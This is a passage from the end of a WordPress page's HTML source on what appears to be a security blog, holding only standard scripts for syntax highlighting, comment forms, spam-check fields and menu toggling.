http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPlain.js','powershell ps          http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPowerShell.js','py python				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPython.js','ruby rails ror rb		http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushRuby.js','sass scss              http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushSass.js','scala					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushScala.js','sql					http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushSql.js','vb vbnet				http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushVb.js','xml xhtml xslt html	http://tomsonsec.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushXml.js');SyntaxHighlighter.defaults['toolbar']=false;SyntaxHighlighter.defaults['tab-size']=4;SyntaxHighlighter.all();</script>
 
<script data-rocketoptimized="true" type="text/rocketscript">function showhide_toggle(a,b,c,d){var e=jQuery("#"+a+"-link-"+b),f=jQuery("#"+a+"-content-"+b);a=jQuery("#"+a+"-toggle-"+b);e.toggleClass("sh-show sh-hide");f.toggleClass("sh-show sh-hide").toggle();a.text()===c?a.text(d):a.text(c)};</script>
<script data-rocketoptimized="true" type="text/rocketscript">//<![CDATA[
var ak_js=document.getElementById("ak_js");if(!ak_js){ak_js=document.createElement('input');ak_js.setAttribute('id','ak_js');ak_js.setAttribute('name','ak_js');ak_js.setAttribute('type','hidden');}
else{ak_js.parentNode.removeChild(ak_js);}
ak_js.setAttribute('value',(new Date()).getTime());var commentForm=document.getElementById('commentform');if(commentForm){commentForm.appendChild(ak_js);}
else{var replyRowContainer=document.getElementById('replyrow');if(replyRowContainer){var children=replyRowContainer.getElementsByTagName('td');if(children.length>0){children[0].appendChild(ak_js);}}}
//]]></script>
<script data-rocketoptimized="true" type="text/rocketscript">//<![CDATA[
var addComment={moveForm:function(a,b,c,d){var e,f=this,g=f.I(a),h=f.I(c),i=f.I("cancel-comment-reply-link"),j=f.I("comment_parent"),k=f.I("comment_post_ID");if(g&&h&&i&&j){f.respondId=c,d=d||!1,f.I("wp-temp-form-div")||(e=document.createElement("div"),e.id="wp-temp-form-div",e.style.display="none",h.parentNode.insertBefore(e,h)),g.parentNode.insertBefore(h,g.nextSibling),k&&d&&(k.value=d),j.value=b,i.style.display="",i.onclick=function(){var a=addComment,b=a.I("wp-temp-form-div"),c=a.I(a.respondId);if(b&&c)return a.I("comment_parent").value="0",b.parentNode.insertBefore(c,b),b.parentNode.removeChild(b),this.style.display="none",this.onclick=null,!1};try{f.I("comment").focus()}catch(l){}return!1}},I:function(a){return document.getElementById(a)}};
//]]></script>
<script data-rocketoptimized="true" type="text/rocketscript">//<![CDATA[
(function(){var nav=document.getElementById('site-navigation'),button,menu;if(!nav)
return;button=nav.getElementsByTagName('h3')[0];menu=nav.getElementsByTagName('ul')[0];if(!button)
return;if(!menu||!menu.childNodes.length){button.style.display='none';return;}
button.onclick=function(){if(-1==menu.className.indexOf('nav-menu'))
menu.className='nav-menu';if(-1!=button.className.indexOf('toggled-on')){button.className=button.className.replace(' toggled-on','');menu.className=menu.className.replace(' toggled-on','');}else{button.className+=' toggled-on';menu.className+=' toggled-on';}};})();
//]]></script>

</body></html>